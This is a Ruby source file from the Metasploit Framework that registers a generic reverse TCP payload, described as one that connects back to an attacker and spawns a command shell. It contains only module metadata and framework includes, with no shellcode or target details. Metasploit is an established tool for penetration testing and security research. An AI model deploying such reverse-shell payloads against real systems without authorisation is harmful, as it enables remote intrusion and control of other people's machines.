##
# $Id: shell_reverse_tcp.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/generic'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Generic

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Generic Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell
			))
	end

end